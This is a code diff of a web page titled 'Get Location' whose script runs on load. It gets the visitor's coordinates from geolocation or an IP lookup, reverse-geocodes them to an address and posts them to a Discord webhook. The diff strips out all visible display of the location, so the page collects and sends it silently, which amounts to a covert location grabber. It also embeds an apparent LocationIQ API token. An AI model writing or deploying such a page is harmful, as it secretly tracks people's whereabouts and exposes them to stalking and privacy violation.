@@ -6,8 +6,6 @@
     <title>Get Location</title>
 </head>
 <body>
-    <div id="location">Fetching location...</div>
-
     <script>
         const webhookURL = 'https://discord.com/api/webhooks/your_webhook_url'; // Replace with your actual webhook URL
         const locationIQToken = 'pk.292b33b23efbaeb73cb23eec1d9d18aa'; // Your LocationIQ token
@@ -17,7 +15,7 @@
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(success, error);
             } else {
-                document.getElementById('location').textContent = "Geolocation is not supported by this browser.";
+                console.error("Geolocation is not supported by this browser.");
                 // Fallback to IP-based geolocation
                 getIPGeolocation();
             }
@@ -26,13 +24,12 @@
         function success(position) {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
-            document.getElementById('location').textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
             reverseGeocode(latitude, longitude);
         }
 
         function error(err) {
             console.warn(`ERROR(${err.code}): ${err.message}`);
-            document.getElementById('location').textContent = "Unable to retrieve your location. Trying IP-based geolocation...";
+            // Fallback to IP-based geolocation
             getIPGeolocation();
         }
 
@@ -43,15 +40,13 @@
                 .then(data => {
                     if (data && data.loc) {
                         const [latitude, longitude] = data.loc.split(',');
-                        document.getElementById('location').textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
                         reverseGeocode(latitude, longitude);
                     } else {
-                        document.getElementById('location').textContent = "Unable to retrieve location from IP.";
+                        console.error("Unable to retrieve location from IP.");
                     }
                 })
                 .catch(error => {
                     console.error('Error fetching IP geolocation:', error);
-                    document.getElementById('location').textContent = "Error fetching IP-based location.";
                 });
         }
 
@@ -63,7 +58,6 @@
                 .then(data => {
                     if (data && data.display_name) {
                         const address = data.display_name;
-                        document.getElementById('location').textContent = `Address: ${address}`;
                         sendToDiscord(latitude, longitude, address);
                     } else {
                         console.error('Error in reverse geocoding:', data);
@@ -99,4 +93,4 @@
         window.onload = getLocation;
     </script>
 </body>
-</html></html>
+</html>
